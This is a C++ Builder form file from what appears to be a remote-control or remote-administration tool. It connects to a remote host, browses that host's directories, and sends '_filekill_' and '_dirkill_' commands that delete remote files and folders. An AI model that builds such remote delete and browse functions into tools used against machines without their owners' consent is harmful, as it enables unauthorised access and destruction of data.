//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Unit1.h"
#include "Unit4.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
TForm4 *Form4;
AnsiString FD1="C:",FD2="";
//---------------------------------------------------------------------------
__fastcall TForm4::TForm4(TComponent* Owner)
    : TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TForm4::ClientSocket1Read(TObject *Sender,
      TCustomWinSocket *Socket)
{
    AnsiString text = Socket->ReceiveText();
    if(text.Pos("_listup_"))
    {
        text.Delete(1,8);
        FLB1->Items->Text = text.SubString(1,text.Pos("#")-1);
        text.Delete(1,text.Pos("#"));
        FLB2->Items->Text = text;
    }    
}
//---------------------------------------------------------------------------

void __fastcall TForm4::FLB1DblClick(TObject *Sender)
{
    FD2=FLB1->Items->Strings[FLB1->ItemIndex];
    if(FD2=="."||FD2=="..")
    {
        FD1 = Label1->Caption.SubString(1,Label1->Caption.LastDelimiter("\\")-1);
    }
    else
    {
        FD1=FD1+"\\"+FD2;
    }
    Label1->Caption = FD1;
    ClientSocket1->Socket->SendText("_dirup_"+Label1->Caption);
}
//---------------------------------------------------------------------------
void __fastcall TForm4::N2Click(TObject *Sender)
{
    ClientSocket1->Socket->SendText("_filekill_"+Label1->Caption+"\\"+FLB2->Items->Strings[FLB2->ItemIndex]);
}
//---------------------------------------------------------------------------
void __fastcall TForm4::N4Click(TObject *Sender)
{
    ClientSocket1->Socket->SendText("_dirkill_"+Label1->Caption+"\\"+FLB1->Items->Strings[FLB1->ItemIndex]);
    ClientSocket1->Socket->SendText("_dirup_"+Label1->Caption);
}
//---------------------------------------------------------------------------
void __fastcall TForm4::FormShow(TObject *Sender)
{
    ClientSocket1->Host = RIP;
    ClientSocket1->Active = true;
    ClientSocket1->Socket->SendText("_dirup_"+Label1->Caption);
}
//---------------------------------------------------------------------------
void __fastcall TForm4::ClientSocket1Error(TObject *Sender,
      TCustomWinSocket *Socket, TErrorEvent ErrorEvent, int &ErrorCode)
{
    ErrorCode = 0;
    ClientSocket1->Active = false;
    Form1->Visible = true;
    Form4->Hide();
}
//---------------------------------------------------------------------------
void __fastcall TForm4::ClientSocket1Disconnect(TObject *Sender,
      TCustomWinSocket *Socket)
{
    ClientSocket1->Active = false;
    Form1->Visible = true;
    Form4->Hide();
}
//---------------------------------------------------------------------------
void __fastcall TForm4::N5Click(TObject *Sender)
{
    Form1->Visible = true;
    Form4->Hide();
}
//---------------------------------------------------------------------------
